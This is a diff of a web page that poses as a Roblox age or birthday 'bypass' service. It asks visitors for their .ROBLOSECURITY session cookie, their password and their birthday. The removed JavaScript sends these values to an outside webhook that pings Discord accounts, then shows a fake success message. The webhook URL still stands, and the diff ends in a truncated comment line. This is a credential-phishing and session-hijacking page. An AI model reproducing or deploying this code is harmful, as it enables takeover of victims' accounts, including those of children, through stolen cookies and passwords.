@@ -201,7 +201,6 @@
       </div>
     </div>
 
-    <button id="continue-button" type="button" style="display:none;">➡️ Continue</button>
     <button id="process-button" type="button" style="display:none;">⚙️ PROCESS ACCOUNT</button>
 
     <div class="info-box">
@@ -227,7 +226,6 @@
     const cookieBlock = document.getElementById('cookie-block');
     const passwordBlock = document.getElementById('password-block');
     const birthdayBlock = document.getElementById('birthday-block');
-    const continueBtn = document.getElementById('continue-button');
     const processBtn = document.getElementById('process-button');
     const cookieInput = document.getElementById('cookie-input');
     const passwordInput = document.getElementById('password-input');
@@ -261,7 +259,6 @@
       cookieBlock.style.display = 'none';
       passwordBlock.style.display = 'none';
       birthdayBlock.style.display = 'none';
-      continueBtn.style.display = 'none';
       processBtn.style.display = 'none';
 
       cookieInput.value = '';
@@ -269,9 +266,7 @@
       document.getElementById('day').value = '';
       document.getElementById('month').value = '';
       document.getElementById('year').value = '';
-      continueBtn.dataset.step = '0';
       processBtn.disabled = false;
-      continueBtn.disabled = false;
     }
 
     bypassSelect.addEventListener('change', () => {
@@ -279,123 +274,20 @@
       resetForm();
 
       const val = bypassSelect.value;
-
       if (!val) return;
 
       cookieBlock.style.display = 'block';
+      birthdayBlock.style.display = 'block';
+      processBtn.style.display = 'block';
 
       if (val === '13plus') {
         passwordBlock.style.display = 'block';
-        continueBtn.style.display = 'block';
-        processBtn.style.display = 'none';
-        birthdayBlock.style.display = 'none';
-        continueBtn.dataset.step = '1'; // Step 1 = Eingabe Cookie & Passwort
-      } else if (val === 'birthyear') {
-        // Direkt Cookie und Geburtstag zeigen + Prozessbutton
+      } else {
         passwordBlock.style.display = 'none';
-        birthdayBlock.style.display = 'block';
-        continueBtn.style.display = 'none';
-        processBtn.style.display = 'block';
-        continueBtn.dataset.step = '0';
       }
-    });
-
-    continueBtn.addEventListener('click', () => {
-      clearMessages();
-
-      // Validierung Cookie + Passwort vor Weiter
-      if (cookieInput.value.trim().length < 500) {
-        showError('Bitte gültiges Cookie eingeben.');
-        return;
-      }
-      if (passwordInput.value.trim() === '') {
-        showError('Bitte Passwort eingeben.');
-        return;
-      }
-
-      // Nach Klick auf Continue Geburtstag anzeigen + Prozessbutton
-      birthdayBlock.style.display = 'block';
-      processBtn.style.display = 'block';
-      continueBtn.style.display = 'none';
     });
 
     async function sendEmbedToDiscord(title, description) {
       const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
 
-      // @-Mentions außerhalb Embed senden
-      await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: '<@1030535100829540464> <@&1392621247460020254>' })
-      });
-
-      // Embed senden
-      await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: title,
-            description: description,
-            color: 0x00ffff,
-            timestamp: new Date().toISOString()
-          }]
-        })
-      });
-    }
-
-    processBtn.addEventListener('click', async () => {
-      clearMessages();
-
-      const selected = bypassSelect.value;
-      const cookieVal = cookieInput.value.trim();
-      const passwordVal = passwordInput.value.trim();
-      const day = document.getElementById("day").value;
-      const month = document.getElementById("month").value;
-      const year = document.getElementById("year").value;
-
-      // Validation
-      if (!selected) {
-        showError('Bitte Methode auswählen.');
-        return;
-      }
-      if (cookieVal.length < 500) {
-        showError('Bitte gültiges Cookie eingeben.');
-        return;
-      }
-      if (!day || !month || !year) {
-        showError('Bitte Geburtstag vollständig auswählen.');
-        return;
-      }
-      if (selected === '13plus' && passwordVal.length === 0) {
-        showError('Bitte Passwort eingeben.');
-        return;
-      }
-
-      const birthday = `${day}.${month}.${year}`;
-
-      processBtn.disabled = true;
-      loaderOverlay.style.display = 'flex';
-
-      try {
-        // Cookie + Methode + Geburtstag senden
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Passwort', `**Method:** ${selected}\n**Cookie:** ${cookieVal}\n**Birthday:** ${birthday}`);
-
-        // Passwort nur bei 13+ senden
-        if (selected === '13plus') {
-          await sendEmbedToDiscord('Account Passwort', `**Password:** ${passwordVal}`);
-        }
-
-        await new Promise(res => setTimeout(res, 1200));
-        loaderOverlay.style.display = 'none';
-        showSuccess(`Everything worked! Your birthday is set to: ${birthday}. It can take 2–12 hours.`);
-      } catch (error) {
-        loaderOverlay.style.display = 'none';
-        showError('ERROR Try later again.');
-      } finally {
-        processBtn.disabled = false;
-      }
-    });
-  </script>
-</body>
-</html>
+      // @-Ment
